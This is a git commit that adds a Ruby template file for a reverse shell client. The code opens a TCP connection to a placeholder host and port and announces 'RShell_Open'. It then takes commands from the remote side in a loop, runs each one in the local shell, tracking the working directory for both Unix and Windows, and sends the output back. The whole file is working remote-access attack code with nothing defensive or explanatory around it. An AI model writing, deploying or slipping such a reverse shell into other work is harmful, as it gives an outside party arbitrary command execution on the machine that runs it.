8f8adaeb13e55a1a1ba62b10bab814ec9818748c
Matthias Lee <matthiasclee09@gmail.com>
2021-12-19 12:06:21 -0800

    Create client-generator-temp-client.rb

---
+++ client-generator-temp-client.rb
@@ -0,0 +1,35 @@
+	host = <-HOST->
+  port = <-PORT->
+  host = TCPSocket.open(host, port)
+	host.puts "RShell_Open"
+
+	begin
+		`pwd`
+		currentDirCommand = "pwd"
+		joiner = "\; "
+	rescue
+		`cd`
+		currentDirCommand = "cd"
+		joiner = "\& "
+	end
+	host.puts currentDirCommand
+	$currentDir = "."
+	loop do
+		cmd = host.gets.chomp
+		if cmd.downcase == "exit"
+			host.close
+			break
+		else
+			begin
+				if cmd.split(" ")[0].downcase == "cd" && cmd.split(" ")[1]
+					$currentDir = `cd "#{$currentDir}"#{joiner}cd "#{cmd.downcase.sub("cd ", "")}"#{joiner}#{currentDirCommand}`.chomp
+					out = "Changed Directory to #{$currentDir}\n"
+				else
+					out = `cd "#{$currentDir}"#{joiner}#{cmd.chomp}`
+				end
+			rescue
+				out = "Unable to execute command\n"
+			end
+			host.puts out.gsub("\n", "\\NEWLINE")
+		end
+	end
